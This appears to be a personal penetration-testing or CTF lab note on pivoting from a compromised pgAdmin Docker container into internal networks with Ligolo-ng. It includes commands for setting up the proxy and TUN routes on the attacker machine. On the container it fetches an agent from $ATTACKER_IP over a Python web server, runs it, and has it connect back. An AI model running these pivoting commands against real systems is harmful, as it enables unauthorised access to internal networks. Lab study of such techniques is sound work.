Let’s map your environment:

 ✔ You are inside a Docker container
 ✔ The internal network is `172.18.0.0/16`
 ✔ There are multiple internal services:
- Web app → `172.18.0.2`
- PostgreSQL → `172.18.0.3`
- Possibly more containers

✔ You want to explore the internal network
✔ You want to understand how services relate to the host

**Ligolo-ng is the better fit**
because your goal is **network exploration**, not just tunneling a single port.


---

## Installing Ligolo‑ng


#Attakiing_machine 

- Run this code on the same directory 

```
# Download Ligolo-ng
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

# Extract
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy
./proxy -selfcert -laddr 0.0.0.0:11601
```

![[ligolo-ng.proxy.png]]



#Attakiing_machine 
- Open a python web server on the same directory you install *ligolo-ng*.
```
python3 -m http.server 8000
```


## Downloading and executing agent on container

#pgAdmin_container_shell 
Download and execute agent on container 

```
wget http://$ATTACKER_IP:8000/agent 
chmod +x agent 
./agent -connect $ATTACKER_IP:11601 -ignore-cert
```

![[ligolo-ng.agent.png]]


## Adding routing

#Attaking_machine 
- Route Docker network 

```
sudo ip route add 172.18.0.0/24 dev ligolo
```
 
 - Route internal network (discovered later)

```
sudo ip route add 192.168.100.0/24 dev ligolo
```
